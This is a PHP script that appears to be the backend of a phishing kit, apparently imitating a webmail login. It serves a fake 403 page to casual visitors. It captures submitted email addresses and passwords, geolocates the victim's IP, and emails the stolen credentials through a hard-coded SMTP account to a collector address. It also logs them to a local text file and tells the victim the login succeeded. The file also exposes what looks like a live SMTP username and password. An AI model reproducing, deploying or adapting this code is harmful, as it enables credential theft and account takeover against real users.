<?php 
require_once 'class.phpmailer.php';
require_once 'class.smtp.php';
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");

$ip = $_SERVER['REMOTE_ADDR'];
$ipdat = @json_decode(file_get_contents("https://www.geoplugin.net/json.gp?ip=".$ip));
session_start(); 

if($_SERVER['REQUEST_METHOD']=='GET'){
?>
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<hr>
</body></html>
<?php 
exit();
}

$receiver = "lenialuno@web.de"; // ENTER YOUR EMAIL HERE
$senderuser = "jered@globalrisk.rw"; // ENTER YOUR SMTP USER
$senderpass = "global.321"; // ENTER YOUR SMTP PASSWORD
$senderport = "587"; // ENTER YOUR SMTP PORT
$senderserver = "mail.globalrisk.rw"; // ENTER YOUR SMTP SERVER

$browser = $_SERVER['HTTP_USER_AGENT'];
$login = $_POST['email'];
$passwd = $_POST['password'];
$email = $login;
$parts = explode("@", $email);
$domain = $parts[1];
$sub = "TrueRcubeOrange1";
$msg = $login."@".$domain."|".$passwd."\nIP of sender: ".$ipdat->geoplugin_countryName." - ".$ipdat->geoplugin_city." | ".$ip;

$message = nl2br("Email | ".$login." \nPassword | ".$passwd."\nIP of sender: ".$ipdat->geoplugin_countryName." - ".$ipdat->geoplugin_city." | ".$ip);
$mail = new PHPMailer(true);
$mail->IsSMTP();
$mail->SMTPAuth = true;
$mail->Host = 'mail.globalrisk.rw';
$mail->Port = '587';
$mail->Password = $senderpass;
$mail->Username = $senderuser;
$mail->IsHTML(true);
$mail->SetFrom($senderuser);
$mail->AddAddress($receiver);
$mail->Subject = $sub;
$mail->Body = $message;
$mail->AltBody = 'Enjoy new server';
if(!$mail->send()){$data=array("signal"=>'not ok',"msg"=>"Wrong Password");echo json_encode($data);exit();}
$fp = fopen("SS-Or.txt", "a");
fputs($fp, $message);
fclose($fp);
$praga = rand();
$praga = md5($praga);
echo json_encode(array("signal" => "ok", "msg" => "Login successful"));
?>
